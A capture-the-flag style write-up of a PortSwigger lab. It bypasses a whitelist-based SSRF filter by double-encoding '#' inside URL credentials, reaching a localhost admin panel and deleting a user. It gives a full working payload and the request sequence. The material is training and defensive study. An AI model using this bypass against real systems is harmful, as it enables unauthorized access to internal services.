Lab: SSRF with whitelist-based input filter
Category: SSRF
Platform: PortSwigger Web Academy
Difficulty: Expert
URL: portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

Goal: Access admin interface at http://localhost/admin and delete user carlos, bypassing a whitelist-based anti-SSRF defense.

Vulnerability: App validates stockApi host against a strict whitelist (stock.weliketoshop.net only). App supports embedded URL credentials (user@host syntax) — this becomes the bypass vector via a parser mismatch: the validator and the actual HTTP client parse the authority component of the URL differently.

Steps:

1. Baseline: stockApi=http://127.0.0.1/ → blocked: "External stock check host must be stock.weliketoshop.net".
2. Confirmed embedded credentials supported: stockApi=http://username@stock.weliketoshop.net → accepted (no error).
3. Appended raw #: stockApi=http://username#@stock.weliketoshop.net → 400 Bad Request (rejected outright).
4. Double-URL-encoded the # (# → %23 → %2523): stockApi=http://username%2523@stock.weliketoshop.net/ → 500 Internal Server Error, confirming the server attempted to connect to username as a host — validator was fooled, real request went elsewhere.
5. Replaced username with actual target: stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin → 200 OK, admin panel rendered (Users list + Delete links).
6. Final payload: stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos → 302 Found, redirected to /admin → user deleted, lab Solved.

Payload: stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
Injection point: stockApi body parameter (POST /product/stock)

Takeaway: Whitelist validators that parse URLs to extract the "hostname" can be fooled by double-encoding fragment (#) markers — the validator decodes once and sees a harmless-looking whitelisted domain, but the underlying HTTP client decodes again and treats everything before the (now-revealed) @ as the real host. This is a textbook URL parser confusion bug — same root cause as the blacklist bypass earlier, just applied differently: filter and fetcher disagree on what the URL "means."
